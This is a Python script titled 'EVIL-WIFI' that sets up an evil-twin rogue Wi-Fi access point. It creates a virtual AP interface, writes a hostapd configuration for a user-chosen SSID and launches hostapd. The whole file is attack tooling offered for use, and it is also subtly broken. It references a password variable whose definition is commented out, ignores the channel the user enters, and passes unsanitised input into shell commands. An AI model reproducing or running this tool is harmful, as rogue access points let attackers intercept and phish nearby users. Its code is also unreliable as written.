import os 
from scapy.all import *
def main():
    print("""
        -----------------------------------------------------------------
        |  ___  __      __  _   _          __        __  _   ____   _   |
        | |  _| \ \    / / |_| | |         \ \      / / |_| |  __| |_|  |
        | | |_   \ \  / /   _  | |    ___   \ \    / /   _  | |__   _   |
        | |  _|   \ \/ /   | | | |   |___|   \ \/\/ /   | | |  __| | |  |
        | | |_     \  /    | | | |__          \    /    | | | |    | |  |
        | |___|     \/     |_| |____|          \/\/     |_| |_|    |_|  |
        |                                                               |
        -----------------------------------------------------------------
        

    """)
#    try:
    os.system("ifconfig")
    print("[#] enter interface")
    iface = input("----> ")
    r = True
    f = 1
    command = "ifconfig "+iface+" down"
    os.system(command)
    while r:
        ff = str(f)
        command = "iw phy"+ff+" info"
        res = subprocess.run(command, shell=True, capture_output=True, text=True)
        n = res.stdout
        n = str(n)
        if "Options:" in n:
            print("[#] detecting phy interface...")
            f = f + 1
        elif "Usage:  iw [options] command" not in n:
            phy = "phy"+ff
            r = False
    command = "sudo iw "+phy+" interface add eviltwin type __ap"
    os.system(command)
    command = "ifconfig eviltwin up"
    os.system(command)
    os.system("clear")
    print("[#] enter ssid name")
    ssid = input("----> ")
    print("[#] enter channel")
    ch = input("----> ")
    #print("[#] enter password")
    #valid = False
    #while not valid:
    #    pswd = input("----> ")
    #    if len(pswd) < 8 or len(pswd) > 63:
    #        print("[!] password lenght error min of 8 and max of 63")
    #    else:
    #        valid = True

    os.system("clear")
    print("[IFACE] ", phy)
    print("[SSID] ", ssid)
    #print("[PASSWORD] ", pswd)
    print("[CHANNEL] ", ch)
    print("[CTRL+C] press CTRL+C to exit")
    input("[ENTER] run? ")
    x = """
interface=eviltwin
driver=nl80211
ssid="""+ssid+"""
channel=8
hw_mode=g
wme_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
wpa_passphrase="""+pswd+"""
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP"""
    command = "rm evil-twin-temp/hostapd.conf"
    os.system(command)
    f = open("evil-twin-temp/hostapd.conf","x+")
    f.writelines(x)
    f.close()
    print("[#] hostpad.conf made!")
    print("[#] lunching....")
    command = "hostapd evil-twin-temp/hostapd.conf"
    try:
        os.system(command)
        print("[#] done!")
    except KeyboardInterrupt:
        print("[#] bye...")
#    except Exception:
#        print("[!]")

#main()



# for encrypted wifi hotspot

'''
interface=eviltwin
driver=nl80211
ssid="""+ssid+"""
channel=8
hw_mode=g
wme_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=3
wpa_passphrase="""+pswd+"""
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
'''







